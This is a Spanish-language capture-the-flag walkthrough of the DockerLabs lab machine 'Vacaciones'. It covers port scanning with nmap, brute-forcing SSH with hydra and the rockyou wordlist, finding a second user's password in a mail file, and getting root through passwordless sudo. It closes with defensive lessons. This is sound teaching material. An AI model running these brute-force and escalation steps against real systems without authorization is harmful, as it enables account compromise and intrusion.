# 🖥️ **Máquina: Vacaciones**

- **🔹 Dificultad:** Muy Fácil  
- **📌 Descripción:**  
  Laboratorio enfocado en practicar técnicas de reconocimiento, ataque de fuerza bruta a SSH y escalada de privilegios. Ideal para principiantes en el mundo del pentesting y CTFs.

- **🎯 Objetivo:**  
  - Enumerar servicios expuestos.
  - Acceder mediante fuerza bruta SSH.
  - Realizar cambio de usuario vía nueva sesión SSH.
  - Escalar privilegios a `root`.

![Despliegue](/Tproot/Imagenes/Plantilla.jpeg)

---

## 🐳 **Despliegue en DockerLabs**

### 1️⃣ Preparar el entorno

Descomprimimos el archivo `.zip` con:

```bash
7z e vacaciones.zip
```

Y desplegamos el contenedor:

```bash
sudo bash auto_deploy.sh vacaciones.tar
```

📌 **Nota:** IP asignada: `172.17.0.2`.

📸 **Captura:**

![Despliegue](/Vacaciones/Imagenes/Activo.jpeg)

---

## 🛰️ **Reconocimiento Inicial**

### 2️⃣ Comprobar conectividad

```bash
ping -c4 172.17.0.2
```

📸 **Captura:**

![Ping](/Vacaciones/Imagenes/Ping.jpeg)

---

## 🌐 **Enumeración Web**

Realizamos una primera consulta HTTP:

```bash
curl http://172.17.0.2
```

Obtenemos un mensaje oculto:

```
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

📸 **Captura:**

![Página Web](/Vacaciones/Imagenes/Pagina.jpeg)

---

## 🔍 **Escaneo de Puertos**

Escaneo rápido con `nmap`:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

Resultados:

- Puerto **22**: SSH
- Puerto **80**: HTTP

📸 **Captura:**

![Puertos Abiertos](/Vacaciones/Imagenes/Puertos.jpeg)

### 3️⃣ Detección de Servicios

```bash
nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
```

Servicios:

- SSH → OpenSSH 7.6p1
- HTTP → Apache 2.4.29

📸 **Captura:**

![Servicios Detectados](/Vacaciones/Imagenes/Servicios.jpeg)

---

# 📋 **Resumen de Servicios Detectados**

| Servicio | Puerto | Versión                        |
|:---------|:-------|:-------------------------------|
| SSH      | 22     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 |
| HTTP     | 80     | Apache 2.4.29 (Ubuntu)          |

---

## 🔓 **Ataque SSH con Fuerza Bruta**

### 4️⃣ Uso de Hydra

Realizamos fuerza bruta con `hydra`:

```bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t20
```

📸 **Captura:**

![Hydra](/Vacaciones/Imagenes/Hydra.jpeg)

✅ Resultado:

- **Usuario:** camilo
- **Contraseña:** password1

---

## 🧑‍💻 **Acceso SSH como Camilo**

Ingresamos vía SSH:

```bash
ssh camilo@172.17.0.2
```

📸 **Captura:**

![Contraseña](/Vacaciones/Imagenes/Contraseña.jpeg)

✅ Conexión exitosa.

---

## 📜 **Exploración de archivos internos**

Dentro del sistema:

```bash
cd /var/mail/camilo
cat correo.txt
```

Contenido del archivo:

```
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

✅ Hemos encontrado **una nueva contraseña**.

---

## 🔑 **Nuevo login SSH como Juan**

En lugar de cambiar de usuario, **cerramos sesión SSH de camilo** y abrimos una **nueva conexión SSH**, esta vez como **juan**:

```bash
ssh juan@172.17.0.2
```

Contraseña: `2k84dicb`

✅ Acceso correcto como **juan**.

---

## 🧗 **Escalada de Privilegios a Root**

Listamos los permisos de `sudo`:

```bash
sudo -l
```

Vemos que **juan** puede ejecutar `sudo` sin necesidad de contraseña.

Escalamos:

```bash
sudo su
```

✅ Ahora tenemos privilegios de **root**.

---

# 🏁 **Máquina Completada**

| Usuario | Contraseña | Método de Acceso                 |
|:--------|:-----------|:---------------------------------|
| camilo  | password1  | Hydra + SSH                      |
| juan    | 2k84dicb   | Contraseña encontrada + SSH      |
| root    | N/A        | `sudo su` desde Juan              |

---

# 🛠️ **Herramientas Utilizadas**

| Herramienta | Descripción | Uso |
|:------------|:------------|:----|
| **nmap**    | Escaneo de red | Identificar puertos y servicios abiertos |
| **hydra**   | Fuerza bruta | Obtener acceso SSH explotando contraseñas débiles |
| **ssh**     | Conexión segura | Acceso remoto a los usuarios |
| **sudo**    | Escalada de privilegios | Obtener permisos de superusuario |
| **curl**    | Peticiones HTTP | Extracción de mensajes ocultos |

---

# 📚 **Conclusiones**

Esta máquina refuerza conceptos básicos como:

- Enumeración de servicios.
- Ataques de fuerza bruta con `hydra`.
- Búsqueda de información en archivos del sistema.
- Accesos multiusuario vía SSH.
- Escalada de privilegios basada en mala configuración de `sudo`.

Además, resalta buenas prácticas como:
- No usar contraseñas débiles.
- No dejar información sensible accesible (como correos internos).
- Restringir el acceso de `sudo` solo a usuarios administradores.

---


